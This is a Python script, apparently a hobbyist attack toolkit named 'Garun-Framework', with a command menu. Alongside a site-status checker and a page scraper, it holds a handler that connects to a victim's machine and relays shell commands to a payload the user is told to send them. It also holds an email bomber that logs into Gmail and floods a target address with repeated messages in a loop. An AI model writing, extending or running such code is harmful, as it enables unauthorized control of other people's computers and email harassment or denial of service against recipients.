import requests
import sys
import socket, subprocess
from termcolor import colored
import pyfiglet
import smtplib
import time
import os
os.system('clear')
# ========[Garun-Framework]=======#

# Creator : Anonymous
# email-me: goncertking@gmail.com
# github : https://github.com/Recons7

# ========[Garun-Framework]=======#

figlet_art = pyfiglet.figlet_format("Garun")
print(figlet_art)

print(colored('''
   
      /     \  __  /    ------
     / /     \(  )/    -----
    //////   ' \/ `   ---
   //// / // :    : ---
  // /   /  /`    '--
 //          //..\\
========UU====Garun==UU========
            '//||\\`
              ''``
     ''',"red"))
print(colored("\t\t     D3V3LOPED BY ANON","green"))
info_text_for_usage = colored("""\n\nWelcome To Garun-Framework. To use this tool commands are listed Here : 

Command > type: [restart] To restart garun-Framework.
Command > type: [./site.gframe] To access, Is Site Down. Script 
Command > type: [./g-scrap] To acess Site Scrapper. 
\nCommand > type: [g.handle-paywork] To handle a payload session if sent payload to victim.
\nCommand > type: [clr] To clear the Screen.\nCommand > type: [ebomb] To access Email-Bomber.""", "magenta")

for _commands_ in info_text_for_usage:
	sys.stdout.write(_commands_)
	sys.stdout.flush()
	time.sleep(0.01)


def choose_option():
	__commands__ = input("\n\n\n\n>>> ").lower()
	if "start-gframe" in __commands__:
		print(colored("\nGarun-Framework Already Started Just type listed Commands Above To use them : ","yellow"))
	elif "./site.gframe" in __commands__:
		get_url = input("\nEnter a URL to check : ")
		__checking__ = requests.get(get_url)
		site_status = __checking__.status_code
		if site_status == 200:
			print(colored("\nSite is Up And Working Fine ✓","green"))
		elif site_status == 503:
			print(colored("Service Unavailable. This could be due to temporarily overloading the server or maintenance of the server.", "red"))
	elif "clr" in __commands__:
		os.system('clear')
	elif "restart" in __commands__:
		print("\n\nRestarting Garun-Framework.....")
		os.system('exit()')
		os.system('python3 Garun-Framework.py')
	elif "./g-scrap" in __commands__:
		scrap_url = input("\nEnter a URL to scrap : ")
		get = requests.get(scrap_url)
		print(colored("\n\n==================Scrapping===================\n\n", "yellow"))
		print(colored(get.content, "green"))
		print(colored("\n\n==================Scrapped====================\n\n", "yellow"))
	elif "g.handle-paywork" in __commands__ :
		print(colored("\nYou Have to send payload to victim first to use this handler\n", "yellow"))
		print(colored("Payload is included in Garun-Framework's Directory, send that payload.py to victim.", "yellow"))
		ip = input("\n\nEnter ip address : ")
		port = int(input("\nEnter port number :  "))
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((ip,port))
			cmdlet = input("$")
			while cmdlet!='quit':
				s.send(cmdlet.encode())
				result = s.recv(2048).decode()
				print(result)
				cmdlet = input("$")
			s.close()
		except:
			print("\nsomething error has occurred")
	elif 'ebomb' in __commands__:
		os.system('clear')
		ascii_art = print(colored('''
     _____                                        
  __|___  |__  ______  _____  ____    __  ______  
 |   ___|    ||      >/     \|    \  /  ||      > 
 |   ___|    ||     < |     ||     \/   ||     <  
 |______|  __||______>\_____/|__/\__/|__||______> 
    |_____|                                       
                                                  
''',"red"))
		mail = input("\nEnter Your Email : ")
		print(colored("\nTo use this Bomber Enable less app secure in gmail settings...\n", "yellow"))
		pwd = input("Enter Your Email password : ")
		print("\n")
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()
		server.login(mail, pwd)
		def mail_bomber():
			
			mail_2 = input(colored("Enter email you want to bomb : ","cyan"))
			print("\n")
			msg = input(colored("Enter a message for bombing : ","yellow"))
			print("\n")
			much = int(input(colored("Enter number of bombs : ","red")))
			animation = "|/-\\"
			print("\n")
			print(colored("==========================Bombing==========================","yellow"))
			print("\n")
			for i in range(1,much+1):
				time.sleep(0.0001)
				sys.stdout.write("\r" + animation[i %
				len(animation)])
				sys.stdout.flush()
				print(i," \nPlease wait Bombing : ", mail_2)
				print("\n")
				server.sendmail(mail, mail_2, msg)
				print("\n")
				print("Bombed Succesfully !")
				time.sleep(0.01)
				os.system('clear')
			mail_bomber()
		mail_bomber()
	
	else:
		print(colored("\n\nInvaild Command Type correct Command.\n", "red"))
		  		
	choose_option()
choose_option()
	

